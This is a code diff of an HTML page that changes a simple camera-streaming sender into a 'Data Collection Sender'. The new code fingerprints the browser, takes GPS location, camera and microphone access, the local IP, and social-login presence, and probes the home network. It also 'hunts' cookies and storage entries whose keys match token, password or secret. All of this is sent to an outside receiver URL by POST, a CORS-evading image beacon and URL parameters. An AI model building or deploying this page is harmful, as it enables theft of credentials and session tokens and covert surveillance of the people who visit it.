@@ -1,226 +1,493 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>Camera Sender</title>
+    <title>Data Collector Sender</title>
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <style>
         body {
             font-family: Arial, sans-serif;
             padding: 20px;
-            text-align: center;
             background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
             color: white;
             min-height: 100vh;
-            margin: 0;
         }
         .container {
+            max-width: 800px;
+            margin: 0 auto;
             background: rgba(255, 255, 255, 0.1);
             padding: 30px;
             border-radius: 15px;
             backdrop-filter: blur(10px);
-            max-width: 500px;
-            margin: 0 auto;
         }
-        video {
-            width: 100%;
-            max-width: 300px;
-            border: 3px solid white;
+        .data-section {
+            background: rgba(0, 0, 0, 0.3);
+            margin: 15px 0;
+            padding: 15px;
             border-radius: 10px;
-            margin: 20px 0;
-            background: black;
+            border-left: 4px solid #4CAF50;
         }
         button {
             padding: 12px 24px;
             margin: 10px;
-            font-size: 16px;
-            border: none;
-            border-radius: 25px;
-            cursor: pointer;
             background: #4CAF50;
             color: white;
-            transition: all 0.3s;
-        }
-        button:hover {
-            background: #45a049;
-            transform: scale(1.05);
-        }
-        button:disabled {
-            background: #cccccc;
-            cursor: not-allowed;
+            border: none;
+            border-radius: 20px;
+            cursor: pointer;
+            font-size: 16px;
         }
         .status {
-            padding: 15px;
-            margin: 15px 0;
+            padding: 10px;
+            margin: 10px 0;
+            border-radius: 5px;
             background: rgba(0, 0, 0, 0.3);
-            border-radius: 8px;
-            font-size: 14px;
         }
-        .info {
+        .success { background: rgba(76, 175, 80, 0.3); }
+        .error { background: rgba(244, 67, 54, 0.3); }
+        .info { background: rgba(33, 150, 243, 0.3); }
+        pre {
+            background: rgba(0, 0, 0, 0.5);
+            padding: 10px;
+            border-radius: 5px;
+            overflow-x: auto;
             font-size: 12px;
-            opacity: 0.8;
-            margin-top: 20px;
         }
     </style>
 </head>
 <body>
     <div class="container">
-        <h1>📷 Camera Sender</h1>
-        <p>This site captures camera feed and sends to receiver</p>
-        
-        <video id="webcam" autoplay muted playsinline></video>
-        <canvas id="canvas" style="display: none;"></canvas>
-        
-        <div class="status" id="status">Ready to start</div>
-        
-        <div>
-            <button onclick="startCamera()" id="startBtn">Start Camera</button>
-            <button onclick="startSending()" id="sendBtn" disabled>Start Sending</button>
-            <button onclick="stopEverything()" id="stopBtn" disabled>Stop Everything</button>
+        <h1>📡 Data Collection Sender</h1>
+        <p>This site collects comprehensive information and sends it to the receiver.</p>
+
+        <div class="data-section">
+            <h3>🔍 Step 1: Collect Basic Information</h3>
+            <button onclick="collectBasicInfo()">Collect Basic Data</button>
+            <div id="basicInfoStatus" class="status"></div>
+            <pre id="basicInfoOutput"></pre>
         </div>
-        
-        <div class="info">
-            <p>Receiver: <strong>cam-receiver.vercel.app</strong></p>
-            <p>Frames sent: <span id="frameCount">0</span></p>
-            <p>Last sent: <span id="lastSent">Never</span></p>
+
+        <div class="data-section">
+            <h3>📍 Step 2: Request Location Access</h3>
+            <button onclick="collectLocation()">Get GPS Location</button>
+            <div id="locationStatus" class="status"></div>
+            <pre id="locationOutput"></pre>
         </div>
+
+        <div class="data-section">
+            <h3>📷 Step 3: Request Camera & Microphone</h3>
+            <button onclick="collectMedia()">Access Camera/Mic</button>
+            <div id="mediaStatus" class="status"></div>
+            <video id="webcam" autoplay muted playsinline width="300" style="display: none; border-radius: 10px;"></video>
+        </div>
+
+        <div class="data-section">
+            <h3>🌐 Step 4: Network & Social Media Detection</h3>
+            <button onclick="collectNetworkInfo()">Scan Network & Social</button>
+            <div id="networkStatus" class="status"></div>
+            <pre id="networkOutput"></pre>
+        </div>
+
+        <div class="data-section">
+            <h3>🔐 Step 5: Session & Token Hunting</h3>
+            <button onclick="huntTokens()">Find Session Tokens</button>
+            <div id="tokenStatus" class="status"></div>
+            <pre id="tokenOutput"></pre>
+        </div>
+
+        <div class="data-section">
+            <h3>🚀 Step 6: Send All Data to Receiver</h3>
+            <button onclick="sendAllData()" style="background: #ff9800;">Send Everything to Receiver</button>
+            <div id="sendStatus" class="status"></div>
+        </div>
+
+        <div id="collectedData" style="display: none;"></div>
     </div>
 
     <script>
-        // Configuration - USING YOUR ACTUAL RECEIVER URL
-        const RECEIVER_URL = "https://cam-receiver.vercel.app";
+        // CONFIGURATION - SET YOUR RECEIVER URL HERE
+        const RECEIVER_URL = "https://your-receiver-site.vercel.app";
         
-        let currentStream = null;
-        let isSending = false;
-        let sendInterval;
-        let frameCount = 0;
-        let receiverWindow = null;
-        
-        function updateStatus(message, isError = false) {
-            const status = document.getElementById('status');
-            status.textContent = message;
-            status.style.background = isError ? 'rgba(255, 0, 0, 0.3)' : 'rgba(0, 0, 0, 0.3)';
+        let collectedData = {
+            timestamp: new Date().toISOString(),
+            basicInfo: {},
+            location: {},
+            mediaAccess: {},
+            networkInfo: {},
+            tokens: {},
+            fingerprint: {}
+        };
+
+        function updateStatus(elementId, message, type = 'info') {
+            const element = document.getElementById(elementId);
+            element.innerHTML = message;
+            element.className = `status ${type}`;
         }
-        
-        function updateLastSent() {
-            document.getElementById('lastSent').textContent = new Date().toLocaleTimeString();
-        }
-        
-        async function startCamera() {
+
+        // 1. Collect Basic Information & Fingerprinting
+        async function collectBasicInfo() {
             try {
-                stopEverything();
+                // Get IP address
+                const ipResponse = await fetch('https://api.ipify.org?format=json');
+                const ipData = await ipResponse.json();
                 
-                updateStatus("Requesting camera access...");
-                
-                const stream = await navigator.mediaDevices.getUserMedia({
-                    video: { width: 640, height: 480 }
-                });
-                
-                currentStream = stream;
-                const video = document.getElementById('webcam');
-                video.srcObject = stream;
-                
-                updateStatus("Camera active! Click 'Start Sending'");
-                document.getElementById('startBtn').disabled = true;
-                document.getElementById('sendBtn').disabled = false;
+                // Browser fingerprinting
+                const fingerprint = {
+                    userAgent: navigator.userAgent,
+                    language: navigator.language,
+                    languages: navigator.languages,
+                    platform: navigator.platform,
+                    hardwareConcurrency: navigator.hardwareConcurrency,
+                    deviceMemory: navigator.deviceMemory,
+                    screen: `${screen.width}x${screen.height}`,
+                    colorDepth: screen.colorDepth,
+                    pixelDepth: screen.pixelDepth,
+                    timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+                    cookiesEnabled: navigator.cookieEnabled,
+                    plugins: Array.from(navigator.plugins).map(p => p.name),
+                    fonts: await getFontsList(),
+                    webgl: getWebGLInfo(),
+                    canvas: getCanvasFingerprint(),
+                    audio: getAudioFingerprint()
+                };
+
+                collectedData.basicInfo = {
+                    ip: ipData.ip,
+                    fingerprint: fingerprint,
+                    referrer: document.referrer,
+                    url: window.location.href,
+                    timestamp: new Date().toISOString()
+                };
+
+                updateStatus('basicInfoStatus', '✅ Basic information collected successfully!', 'success');
+                document.getElementById('basicInfoOutput').textContent = JSON.stringify(collectedData.basicInfo, null, 2);
                 
             } catch (error) {
-                updateStatus("Camera error: " + error.message, true);
+                updateStatus('basicInfoStatus', '❌ Error collecting basic info: ' + error.message, 'error');
             }
         }
-        
-        function startSending() {
-            if (!currentStream) {
-                updateStatus("Start camera first!", true);
+
+        // 2. Collect GPS Location
+        function collectLocation() {
+            if (!navigator.geolocation) {
+                updateStatus('locationStatus', '❌ Geolocation not supported', 'error');
                 return;
             }
-            
-            isSending = true;
-            frameCount = 0;
-            updateStatus("Sending frames to receiver...");
-            
-            // Open receiver window first
-            receiverWindow = window.open(RECEIVER_URL, 'receiverWindow', 'width=600,height=800');
-            
-            // Start sending frames every 3 seconds
-            sendInterval = setInterval(sendFrame, 3000);
-            
-            document.getElementById('sendBtn').disabled = true;
-            document.getElementById('stopBtn').disabled = false;
-            
-            // Send first frame immediately
-            setTimeout(sendFrame, 1000);
-        }
-        
-        function sendFrame() {
-            if (!isSending || !currentStream) return;
-            
-            const video = document.getElementById('webcam');
-            const canvas = document.getElementById('canvas');
-            const context = canvas.getContext('2d');
-            
-            // Set canvas size to match video
-            canvas.width = video.videoWidth;
-            canvas.height = video.videoHeight;
-            
-            // Capture frame
-            context.drawImage(video, 0, 0, canvas.width, canvas.height);
-            
-            // Convert to data URL
-            const imageData = canvas.toDataURL('image/jpeg', 0.7);
-            
-            // Send to receiver
-            sendToReceiver(imageData);
-            
-            frameCount++;
-            document.getElementById('frameCount').textContent = frameCount;
-            updateLastSent();
-        }
-        
-        function sendToReceiver(imageData) {
-            // Method 1: Update the receiver window if it's open
-            if (receiverWindow && !receiverWindow.closed) {
-                try {
-                    receiverWindow.postMessage({
-                        type: 'newImage',
-                        image: imageData,
-                        timestamp: Date.now(),
-                        frameNumber: frameCount
-                    }, RECEIVER_URL);
-                } catch (error) {
-                    console.log('Window communication error:', error);
+
+            navigator.geolocation.getCurrentPosition(
+                position => {
+                    collectedData.location = {
+                        latitude: position.coords.latitude,
+                        longitude: position.coords.longitude,
+                        accuracy: position.coords.accuracy,
+                        altitude: position.coords.altitude,
+                        altitudeAccuracy: position.coords.altitudeAccuracy,
+                        heading: position.coords.heading,
+                        speed: position.coords.speed,
+                        timestamp: position.timestamp
+                    };
+
+                    updateStatus('locationStatus', '✅ Location data collected successfully!', 'success');
+                    document.getElementById('locationOutput').textContent = JSON.stringify(collectedData.location, null, 2);
+                },
+                error => {
+                    updateStatus('locationStatus', '❌ Location access denied: ' + error.message, 'error');
+                },
+                {
+                    enableHighAccuracy: true,
+                    timeout: 10000,
+                    maximumAge: 0
                 }
+            );
+        }
+
+        // 3. Collect Camera & Microphone Access
+        async function collectMedia() {
+            try {
+                const stream = await navigator.mediaDevices.getUserMedia({ 
+                    video: true, 
+                    audio: true 
+                });
+
+                collectedData.mediaAccess = {
+                    camera: true,
+                    microphone: true,
+                    devices: await getMediaDevices(),
+                    streamActive: true
+                };
+
+                // Show camera preview
+                const video = document.getElementById('webcam');
+                video.srcObject = stream;
+                video.style.display = 'block';
+
+                updateStatus('mediaStatus', '✅ Camera & microphone access granted!', 'success');
+                
+            } catch (error) {
+                collectedData.mediaAccess = {
+                    camera: false,
+                    microphone: false,
+                    error: error.message
+                };
+                updateStatus('mediaStatus', '❌ Media access denied: ' + error.message, 'error');
+            }
+        }
+
+        // 4. Network & Social Media Detection
+        async function collectNetworkInfo() {
+            try {
+                // Get local IP via WebRTC
+                const localIP = await getLocalIP();
+                
+                // Social media presence detection
+                const socialMedia = await checkSocialMediaPresence();
+                
+                // Network scanning
+                const networkScan = await scanLocalNetwork();
+
+                collectedData.networkInfo = {
+                    localIP: localIP,
+                    socialMedia: socialMedia,
+                    networkScan: networkScan,
+                    connection: navigator.connection ? {
+                        downlink: navigator.connection.downlink,
+                        effectiveType: navigator.connection.effectiveType,
+                        rtt: navigator.connection.rtt
+                    } : null
+                };
+
+                updateStatus('networkStatus', '✅ Network & social media data collected!', 'success');
+                document.getElementById('networkOutput').textContent = JSON.stringify(collectedData.networkInfo, null, 2);
+                
+            } catch (error) {
+                updateStatus('networkStatus', '❌ Error collecting network info: ' + error.message, 'error');
+            }
+        }
+
+        // 5. Session Token Hunting
+        function huntTokens() {
+            const foundTokens = {
+                urlParams: findTokensInURL(),
+                localStorage: findTokensInStorage('localStorage'),
+                sessionStorage: findTokensInStorage('sessionStorage'),
+                cookies: document.cookie
+            };
+
+            collectedData.tokens = foundTokens;
+
+            updateStatus('tokenStatus', '✅ Token hunting completed!', 'success');
+            document.getElementById('tokenOutput').textContent = JSON.stringify(foundTokens, null, 2);
+        }
+
+        // 6. Send All Data to Receiver
+        async function sendAllData() {
+            try {
+                updateStatus('sendStatus', '🔄 Sending data to receiver...', 'info');
+
+                // Add final timestamp
+                collectedData.sentTimestamp = new Date().toISOString();
+
+                // Send via multiple methods for reliability
+                await sendToReceiver(collectedData);
+
+                updateStatus('sendStatus', '✅ All data sent successfully to receiver!', 'success');
+                
+            } catch (error) {
+                updateStatus('sendStatus', '❌ Error sending data: ' + error.message, 'error');
+            }
+        }
+
+        // HELPER FUNCTIONS
+
+        async function getLocalIP() {
+            return new Promise((resolve) => {
+                const pc = new RTCPeerConnection({iceServers: []});
+                pc.createDataChannel('');
+                pc.createOffer().then(offer => pc.setLocalDescription(offer));
+                pc.onicecandidate = ice => {
+                    if (ice.candidate) {
+                        const ip = ice.candidate.candidate.split(' ')[4];
+                        resolve(ip);
+                    }
+                };
+                setTimeout(() => resolve('Unknown'), 1000);
+            });
+        }
+
+        async function checkSocialMediaPresence() {
+            const services = [
+                'https://facebook.com', 'https://twitter.com', 
+                'https://linkedin.com', 'https://instagram.com',
+                'https://github.com', 'https://reddit.com'
+            ];
+            
+            const results = {};
+            
+            for (const service of services) {
+                results[service] = await checkService(service);
             }
             
-            // Method 2: Also use URL method as backup
-            const newWindow = window.open(`${RECEIVER_URL}?image=${encodeURIComponent(imageData)}&frame=${frameCount}&time=${Date.now()}`, '_blank');
-            
-            // Close the backup window after a moment
-            setTimeout(() => {
-                if (newWindow && !newWindow.closed) {
-                    newWindow.close();
-                }
-            }, 1000);
+            return results;
         }
-        
-        function stopEverything() {
-            isSending = false;
-            clearInterval(sendInterval);
+
+        function checkService(url) {
+            return new Promise(resolve => {
+                const img = new Image();
+                img.onload = () => resolve(true);
+                img.onerror = () => resolve(false);
+                img.src = url + '/favicon.ico';
+                setTimeout(() => resolve(false), 1000);
+            });
+        }
+
+        async function scanLocalNetwork() {
+            const commonIPs = ['192.168.1.1', '192.168.0.1', '10.0.0.1'];
+            const results = {};
             
-            if (currentStream) {
-                currentStream.getTracks().forEach(track => track.stop());
-                currentStream = null;
+            for (const ip of commonIPs) {
+                results[ip] = await pingIP(ip);
             }
             
-            document.getElementById('webcam').srcObject = null;
-            document.getElementById('startBtn').disabled = false;
-            document.getElementById('sendBtn').disabled = true;
-            document.getElementById('stopBtn').disabled = true;
-            
-            updateStatus("Stopped");
+            return results;
         }
-        
-        // Clean up on page unload
-        window.addEventListener('beforeunload', stopEverything);
+
+        function pingIP(ip) {
+            return new Promise(resolve => {
+                const img = new Image();
+                const start = Date.now();
+                img.onload = () => resolve({ reachable: true, time: Date.now() - start });
+                img.onerror = () => resolve({ reachable: false, time: null });
+                img.src = `http://${ip}/favicon.ico?t=${Date.now()}`;
+                setTimeout(() => resolve({ reachable: false, time: null }), 2000);
+            });
+        }
+
+        function findTokensInURL() {
+            const params = new URLSearchParams(window.location.search);
+            const tokens = {};
+            const tokenKeywords = ['token', 'session', 'auth', 'key', 'password', 'secret', 'api'];
+            
+            tokenKeywords.forEach(keyword => {
+                if (params.has(keyword)) {
+                    tokens[keyword] = params.get(keyword);
+                }
+            });
+            
+            return tokens;
+        }
+
+        function findTokensInStorage(storageType) {
+            const storage = storageType === 'localStorage' ? localStorage : sessionStorage;
+            const tokens = {};
+            const tokenKeywords = ['token', 'session', 'auth', 'key', 'password', 'secret', 'api'];
+            
+            for (let i = 0; i < storage.length; i++) {
+                const key = storage.key(i);
+                tokenKeywords.forEach(keyword => {
+                    if (key.toLowerCase().includes(keyword)) {
+                        tokens[key] = storage.getItem(key);
+                    }
+                });
+            }
+            
+            return tokens;
+        }
+
+        async function getMediaDevices() {
+            try {
+                const devices = await navigator.mediaDevices.enumerateDevices();
+                return devices.map(device => ({
+                    kind: device.kind,
+                    label: device.label,
+                    deviceId: device.deviceId
+                }));
+            } catch (error) {
+                return [];
+            }
+        }
+
+        // Fingerprinting helper functions
+        function getWebGLInfo() {
+            const canvas = document.createElement('canvas');
+            const gl = canvas.getContext('webgl');
+            if (!gl) return null;
+            
+            return {
+                vendor: gl.getParameter(gl.VENDOR),
+                renderer: gl.getParameter(gl.RENDERER),
+                version: gl.getParameter(gl.VERSION)
+            };
+        }
+
+        function getCanvasFingerprint() {
+            const canvas = document.createElement('canvas');
+            const ctx = canvas.getContext('2d');
+            ctx.textBaseline = 'top';
+            ctx.font = '14px Arial';
+            ctx.fillText('Canvas fingerprint', 2, 2);
+            return canvas.toDataURL();
+        }
+
+        function getAudioFingerprint() {
+            // Simple audio context fingerprint
+            try {
+                const context = new (window.AudioContext || window.webkitAudioContext)();
+                return context.sampleRate;
+            } catch (e) {
+                return null;
+            }
+        }
+
+        async function getFontsList() {
+            // Basic font detection
+            const fonts = [
+                'Arial', 'Helvetica', 'Times New Roman', 
+                'Courier New', 'Verdana', 'Georgia'
+            ];
+            
+            const available = [];
+            for (const font of fonts) {
+                if (document.fonts.check(`12px "${font}"`)) {
+                    available.push(font);
+                }
+            }
+            return available;
+        }
+
+        // Send data to receiver
+        async function sendToReceiver(data) {
+            const payload = {
+                type: 'dataCollection',
+                data: data,
+                sender: window.location.href,
+                timestamp: new Date().toISOString()
+            };
+
+            // Method 1: Send via fetch POST
+            try {
+                await fetch(`${RECEIVER_URL}/api/collect`, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify(payload)
+                });
+            } catch (error) {
+                console.log('Fetch method failed:', error);
+            }
+
+            // Method 2: Send via image beacon (works even if CORS blocked)
+            const img = new Image();
+            img.src = `${RECEIVER_URL}?data=${encodeURIComponent(btoa(JSON.stringify(payload)))}&method=beacon`;
+
+            // Method 3: Open receiver window with data in URL
+            window.open(`${RECEIVER_URL}?payload=${encodeURIComponent(btoa(JSON.stringify(payload)))}`, '_blank');
+
+            // Method 4: Store in localStorage for receiver to pick up
+            localStorage.setItem('collectedData', JSON.stringify(payload));
+        }
+
+        // Initialize
+        window.addEventListener('load', () => {
+            updateStatus('sendStatus', `Ready to send to: ${RECEIVER_URL}`, 'info');
+        });
     </script>
 </body>
 </html>
